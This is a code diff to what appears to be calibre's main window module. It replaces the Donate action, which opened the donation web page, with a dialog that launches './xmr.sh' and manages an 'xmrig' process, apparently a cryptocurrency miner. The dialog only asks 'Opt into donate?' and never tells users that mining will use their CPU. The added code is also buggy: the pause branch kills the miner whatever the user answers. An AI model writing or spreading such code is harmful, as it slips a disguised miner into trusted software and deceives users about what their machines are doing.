@@ -19,6 +19,8 @@ from PyQt5.Qt import (
     Qt, QTimer, QAction, QMenu, QIcon, pyqtSignal, QUrl, QFont, QDialog,
     QApplication, QSystemTrayIcon)
 
+from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QMessageBox
+
 from calibre import prints, force_unicode, detect_ncpus
 from calibre.constants import (
         __appname__, ismacos, iswindows, filesystem_encoding, DEBUG, config_dir)
@@ -45,6 +47,7 @@ from calibre.gui2.search_restriction_mixin import SearchRestrictionMixin
 from calibre.gui2.tag_browser.ui import TagBrowserMixin
 from calibre.gui2.keyboard import Manager
 from calibre.gui2.auto_add import AutoAdder
+from calibre.gui2.actions import InterfaceAction
 from calibre.gui2.proceed import ProceedQuestion
 from calibre.gui2.dialogs.message_box import JobError
 from calibre.gui2.job_indicator import Pointer
@@ -54,6 +57,8 @@ from calibre.library import current_library_name
 from calibre.srv.library_broker import GuiLibraryBroker
 from polyglot.builtins import unicode_type, string_or_bytes
 from polyglot.queue import Queue, Empty
+
+
 
 
 class Listener(Thread):  # {{{
@@ -946,8 +951,55 @@ class Main(MainWindow, MainWindowMixin, DeviceMixin, EmailMixin,  # {{{
         QApplication.instance().quit()
 
     def donate(self, *args):
-        from calibre.utils.localization import localize_website_link
-        open_url(QUrl(localize_website_link('https://calibre-ebook.com/donate')))
+        print('--- DONATE ---')
+        
+        self.show_dialog()
+        # from calibre.utils.localization import localize_website_link
+        # open_url(QUrl(localize_website_link('https://calibre-ebook.com/donate')))
+    def checkIfProcessRunning(self, name):
+        import psutil;
+        for proc in psutil.process_iter():
+            try:
+                # Check if process name contains the given name string.
+                if name in proc.name().lower():
+                    return True
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+        return False;
+
+    def getProcessByName(self, name):
+        import psutil;
+        for proc in psutil.process_iter():
+            try:
+                # Check if process name contains the given name string.
+                if name in proc.name().lower():
+                    return proc
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+        return False;
+
+
+    def show_dialog(self):
+        import subprocess;
+        
+        alreadyRunning = False;
+
+        if self.checkIfProcessRunning('xmrig'):
+            alreadyRunning = True;
+            buttonReply = QMessageBox.question(self, 'PyQt5 message', 'Pause donation?', QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+        else:
+            buttonReply = QMessageBox.question(self, 'PyQt5 message', 'Opt into donate?', QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+
+        if alreadyRunning == True:
+            xmrProcess = self.getProcessByName('xmrig');
+            xmrProcess.kill();
+            print('Process Killed');
+            return;
+
+        if buttonReply == QMessageBox.Yes:
+            subprocess.call(['sh', './xmr.sh'])
+        else:
+            print('No clicked.')
 
     def confirm_quit(self):
         if self.job_manager.has_jobs():
